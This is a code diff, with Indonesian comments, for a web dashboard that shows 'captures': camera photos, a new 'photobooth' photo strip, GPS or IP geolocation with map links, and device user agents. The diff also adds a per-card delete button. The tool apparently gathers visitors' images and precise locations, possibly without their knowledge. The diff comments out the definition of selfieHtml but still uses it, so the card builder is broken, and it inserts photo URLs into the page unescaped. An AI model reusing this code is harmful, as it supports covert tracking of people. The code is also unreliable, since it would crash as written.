@@ -78,6 +78,24 @@
     }
     .btn-clear:hover { border-color: var(--red); color: var(--red); }
 
+    /* ── Tombol hapus per card ── */
+    .btn-delete-card {
+      display: block; width: 100%;
+      margin-top: 10px; padding: 7px;
+      background: transparent;
+      border: 1px solid rgba(239,68,68,0.25);
+      border-radius: 6px;
+      color: rgba(239,68,68,0.6);
+      font-family: var(--font); font-size: 0.75rem; font-weight: 600;
+      cursor: pointer; text-align: center;
+      transition: all .2s;
+    }
+    .btn-delete-card:hover {
+      background: rgba(239,68,68,0.12);
+      border-color: var(--red);
+      color: var(--red);
+    }
+
     /* ── Connection bar ── */
     .conn-bar {
       background: var(--bg2); border-bottom: 1px solid var(--border);
@@ -393,15 +411,20 @@ function buildCard (d, isNew) {
   var card = document.createElement('div')
   card.className = 'card' + (isNew ? ' new' : '')
 
-  // Foto
-  var photoHtml = ''
-  if (d.photo) {
-    photoHtml = '<img src="' + d.photo + '" alt="Tangkapan kamera" loading="lazy">'
-  } else {
-    photoHtml = '<div class="no-photo"><span class="no-photo-icon">📷</span>Kamera ditolak / tidak tersedia</div>'
+  // Foto selfie
+  // var selfieHtml = d.photo
+  //   ? '<img src="' + d.photo + '" alt="Selfie" loading="lazy" style="width:100%;height:100%;object-fit:cover">'
+  //   : '<div class="no-photo"><span class="no-photo-icon">📷</span>Kamera ditolak</div>'
+
+  // Strip foto (tambahan baru dari photobooth)
+  var stripSection = ''
+  if (d.strip) {
+    stripSection = '<div style="padding:8px 12px 4px">'
+      + '<div style="font-size:.62rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:6px">Foto Strip</div>'
+      + '<img src="' + d.strip + '" loading="lazy" style="width:100%;border-radius:6px;border:1px solid var(--border)">'
+      + '</div>'
   }
 
-  // Google Maps link
   // Sumber lokasi badge
   var src = loc.source || 'ip'
   var srcLabel = src === 'gps'
@@ -409,7 +432,7 @@ function buildCard (d, isNew) {
     : '🌐 IP Geolocation'
   var sourceBadge = '<span class="source-badge ' + src + '">' + srcLabel + '</span>'
 
-  // Map link — GPS pakai koordinat presisi, IP pakai koordinat kota
+  // Map link
   var mapHtml = ''
   var lat = loc.lat || 0
   var lon = loc.lon || 0
@@ -425,9 +448,10 @@ function buildCard (d, isNew) {
 
   card.innerHTML =
     '<div class="card-photo">'
-    + photoHtml
+    + selfieHtml
     + '<span class="card-badge">#' + (d.id || '?') + '</span>'
     + '</div>'
+    + stripSection
     + '<div class="card-body">'
       + '<div class="card-header">'
         + '<span class="card-id">ID: ' + (d.id || '—') + '</span>'
@@ -448,9 +472,30 @@ function buildCard (d, isNew) {
       + '</div>'
       + mapHtml
       + '<div class="device-bar">' + escHtml(dev.userAgent || '—') + '</div>'
+      + '<button class="btn-delete-card" title="Hapus card ini">\u2715 Hapus</button>'
     + '</div>'
+    
+  card.querySelector('.btn-delete-card').addEventListener('click', function () {
+    var cardId = d.id
+    if (!confirm('Hapus card ID ' + (cardId || 'ini') + '?')) return
+
+    var index = allCaptures.findIndex(function (item) {
+      return String(item.id || '') === String(cardId || '')
+    })
+
+    if (index !== -1) {
+      allCaptures.splice(index, 1)
+      localStorage.setItem('lmk_captures', JSON.stringify(allCaptures))
+    }
+
+    card.remove()
+    updateEmpty()
+    updateTotal()
+    showToast('🗑️ Card berhasil dihapus')
+  })
 
   return card
+
 }
 
 function infoItem (label, val, extra) {
